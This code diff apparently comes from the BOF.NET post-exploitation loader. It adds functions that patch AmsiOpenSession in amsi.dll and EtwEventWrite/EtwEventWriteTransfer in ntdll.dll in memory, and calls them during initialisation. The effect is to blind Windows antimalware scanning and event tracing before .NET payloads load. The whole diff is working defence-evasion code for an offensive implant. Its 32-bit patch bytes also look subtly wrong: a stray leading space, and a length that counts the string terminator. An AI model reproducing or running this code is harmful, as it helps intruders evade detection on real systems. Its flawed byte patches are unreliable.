@@ -348,6 +348,55 @@ mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainNam
     return nullptr;
 }
 
+void patchFunction(PVOID address, const char* patch, DWORD patchSize){
+
+    BOF_LOCAL(NTDLL, NtProtectVirtualMemory);
+    BOF_LOCAL(msvcrt, memcpy);
+
+    if(address != nullptr){
+
+        PVOID protectBase = address;
+        DWORD protectSize = patchSize;
+        DWORD oldProtect = 0;
+
+        if(NT_SUCCESS(NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect))){
+            memcpy(address, patch, patchSize);
+            NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
+        }
+    }
+}
+
+void patchAmsiEtw(){
+
+    BOF_LOCAL(KERNEL32, GetModuleHandleA);
+    BOF_LOCAL(KERNEL32, LoadLibraryA);
+    BOF_LOCAL(KERNEL32, GetProcAddress);
+
+    HMODULE amsi = GetModuleHandleA("amsi.dll");
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+
+    if(amsi == nullptr)
+        amsi = LoadLibraryA("amsi.dll");
+
+    if(amsi != nullptr){
+#ifdef __x86_64
+        patchFunction(PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x48\x31\xC0", 3);
+#else
+        patchFunction(PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x31\xC0", 3);
+#endif
+    }
+
+    if(ntdll != nullptr){
+#ifdef __x86_64
+        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWrite")), "\xc3", 1);
+        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), "\xc3", 1);
+#else
+        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWrite")), " \xc2\x14\x00\x00", 4);
+        patchFunction(PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), " \xc2\x14\x00\x00", 4);
+#endif
+    }
+}
+
 
 extern "C" void go(char* args , int len) {
 
@@ -383,6 +432,8 @@ extern "C" void go(char* args , int len) {
     }
 
     if(strcmp(bofName, "BOFNET.Bofs.Initializer") == 0){
+
+        patchAmsiEtw();
 
         hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);
 
